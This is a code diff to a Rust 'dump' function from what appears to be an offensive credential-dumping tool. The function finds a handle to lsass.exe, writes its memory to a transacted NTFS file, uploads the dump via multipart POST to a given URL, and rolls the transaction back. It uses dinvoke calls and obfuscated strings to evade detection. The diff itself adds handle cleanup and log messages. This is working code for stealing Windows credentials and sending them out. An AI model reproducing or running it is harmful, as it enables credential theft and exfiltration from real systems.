@@ -42,7 +42,7 @@ pub fn dump(key: &str, url: &str) {
         let shi: *mut SYSTEM_HANDLE_INFORMATION;
         let mut ptr: PVOID;
         let mut buffer;
-        let mut bytes = 2u32;
+        let mut bytes = 1u32;
         let mut c = 0;
 
         loop
@@ -73,8 +73,13 @@ pub fn dump(key: &str, url: &str) {
         
         println!("{}{}{}",&lc!("[+] Retrieved "), (*shi).number_of_handles, &lc!(" handles. Starting analysis..."));
         let mut shtei: *mut SYSTEM_HANDLE_TABLE_ENTRY_INFO = std::mem::transmute(&(*shi).handles);
-        for x in 0..(*shi).number_of_handles 
+        for counter in 0..((*shi).number_of_handles - 1) 
         {
+            
+            if counter % 10000 == 0 && counter > 0
+            {
+                println!("  \\ {} handles have been analyzed so far...", counter);
+            }
 
             if (*shtei).process_id > 4
             {
@@ -121,6 +126,7 @@ pub fn dump(key: &str, url: &str) {
                     if x != 0 
                     {
                         shtei = shtei.add(1);
+                        let _r = dinvoke::close_handle(handle).unwrap();
                         continue;
                     }
                                        
@@ -151,6 +157,8 @@ pub fn dump(key: &str, url: &str) {
 
                     if x != 0 
                     {
+                        let _r = dinvoke::close_handle(*dup_handle).unwrap();
+                        let _r = dinvoke::close_handle(handle).unwrap();
                         shtei = shtei.add(1);
                         continue;
                     }
@@ -183,27 +191,30 @@ pub fn dump(key: &str, url: &str) {
                             ret_len
                         );
 
+
                         if z == 0 
                         {
                             shtei = shtei.add(1);
+                            let _r = dinvoke::close_handle(*dup_handle).unwrap();
+                            let _r = dinvoke::close_handle(handle).unwrap();
                             continue;
                         }
 
                         let mut image_name: String = "".to_string();
-                        let mut buffer: *mut u8 = std::mem::transmute(buffer);
+                        let mut buff: *mut u8 = std::mem::transmute(buffer);
                         for _i in 0..(*ret_len) * 2 // Each char is followed by \0. Lovely LPWSTR...
                         {
-                            if *buffer as char != '\0' 
+                            if *buff as char != '\0' 
                             {
-                                image_name.push(*buffer as char);
+                                image_name.push(*buff as char);
                             }
-                            buffer = buffer.add(1);
+                            buff = buff.add(1);
 
                         }
 
                         // We have a valid process handled
                         if image_name.contains(&lc!("lsass.exe"))
-                        {                         
+                        {               
                             let description = "\0\0".as_ptr() as *mut u16;
                             let z = dinvoke::create_transaction(
                                 ptr::null_mut(),
@@ -219,6 +230,8 @@ pub fn dump(key: &str, url: &str) {
                             if z.0 == -1 
                             {
                                 shtei = shtei.add(1);
+                                let _r = dinvoke::close_handle(*dup_handle).unwrap();
+                                let _r = dinvoke::close_handle(handle).unwrap();
                                 continue;
                             }
                             else
@@ -250,7 +263,10 @@ pub fn dump(key: &str, url: &str) {
 
                             let transacted_file_handle: HANDLE;
                             if z.0 == -1 
-                            {
+                            {                                
+                                let _r = dinvoke::close_handle(transaction_handle).unwrap();
+                                let _r = dinvoke::close_handle(*dup_handle).unwrap();
+                                let _r = dinvoke::close_handle(handle).unwrap();
                                 shtei = shtei.add(1);
                                 continue;
                             }
@@ -301,6 +317,10 @@ pub fn dump(key: &str, url: &str) {
                                 if z.0 == -1 
                                 {
                                     shtei = shtei.add(1);
+                                    let _r = dinvoke::close_handle(transacted_file_handle).unwrap();
+                                    let _r = dinvoke::close_handle(transaction_handle).unwrap();
+                                    let _r = dinvoke::close_handle(*dup_handle).unwrap();
+                                    let _r = dinvoke::close_handle(handle).unwrap();
                                     continue;
                                 }
                                 else
@@ -372,11 +392,9 @@ pub fn dump(key: &str, url: &str) {
 
                                     let read = Cursor::new(&data);
                                     let cont_type = format!("multipart/form-data; boundary={}", boundary);
-                                    //let client = reqwest::Client::new(); 
                                     let _ = ureq::post(url)
                                         .set("content-type",cont_type.as_str()) 
                                         .set("Content-Length", data.len().to_string().as_str())
-                                        //.body(data) 
                                         .send(read);
 
                                     println!("{}", &lc!("[+] File uploaded."));
@@ -394,7 +412,7 @@ pub fn dump(key: &str, url: &str) {
 
                                 if ret
                                 {
-                                    println!("{}",&lc!("[+] Transaction successfully rollbacked."));
+                                    println!("{}",&lc!("[+] Transaction rollbacked."));
                                 }
 
                                 let _r = dinvoke::close_handle(transacted_file_handle).unwrap();
@@ -403,18 +421,25 @@ pub fn dump(key: &str, url: &str) {
 
                                 break;
                             }
-                            
-
+                            else 
+                            {
+                                let _r = dinvoke::close_handle(transacted_file_handle).unwrap();
+                                let _r = dinvoke::close_handle(transaction_handle).unwrap();
+                            }
                         }
                     }
+
+                    let _r = dinvoke::close_handle(*dup_handle).unwrap();
                 }
+
+                let _r = dinvoke::close_handle(handle).unwrap();
             }
 
             shtei = shtei.add(1);
 
-            if x == (*shi).number_of_handles - 1
+            if counter == (*shi).number_of_handles - 1
             {
-                println!("{}", &lc!("[x] Execution failed. Exiting."));
+                println!("{}", &lc!("[x] Could not retrieve a valid handle. Exiting."));
             }
         }            
     }
